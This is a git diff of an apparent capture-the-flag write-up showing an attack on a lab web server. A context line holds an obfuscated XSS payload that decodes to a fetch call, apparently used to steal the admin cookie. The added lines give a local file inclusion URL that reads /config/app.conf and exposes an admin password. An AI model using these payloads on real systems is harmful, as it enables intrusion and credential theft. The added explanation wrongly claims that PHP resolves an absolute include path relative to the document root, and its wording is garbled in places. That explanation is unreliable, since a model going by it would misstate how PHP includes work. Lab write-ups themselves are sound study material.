@@ -45,6 +45,8 @@ username=<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,1
 ```
 
 
+
+
 ### wrtie it in request 
 
 <img width="1244" height="495" alt="image" src="https://github.com/user-attachments/assets/1267a0fa-2789-4277-a1f4-a8a7b4ec07f6" />
@@ -79,12 +81,77 @@ di8rrtpci30gndif971ouhn8ks
 
 ## get admin cookie
 
-
+> ## visit
 
 ```
+http://10.130.129.203/live.php?page=match.php
 ```
 
+> ## i try alot of lfi payloads but all faild but when i try this that we found in logs
 
+```
+http://10.130.129.203/live.php?page=%2Fconfig%2Fapp%2Econf
+```
+
+<img width="1406" height="450" alt="image" src="https://github.com/user-attachments/assets/e05cacd5-7243-4ed5-bbe1-7b130feadace" />
+
+
+## boom found admin password
+
+<img width="1530" height="703" alt="image" src="https://github.com/user-attachments/assets/7ac358e4-9235-4ac8-ba17-cc59c9733110" />
+
+
+<details>
+ What does this mean?
+================
+
+i said to the server:
+
+```
+include("/config/app.conf");
+```
+
+* * * * *
+
+ Where is this file in the first place?
+=========================
+
+From the logs we found:
+
+```
+/var/www/html/config/app.conf
+```
+
+* * * * *
+
+ A very important point:
+------------------
+
+In PHP when I write:
+
+```
+include("/config/app.conf");
+```
+
+ Server hours:
+
+- interpreted by relative to document root
+- Which is often:
+
+```
+/var/www/html
+```
+
+* * * * *
+
+ It remains as if:
+------------------
+
+```
+/var/www/html/config/app.conf
+```
+
+</details>
 
 
 
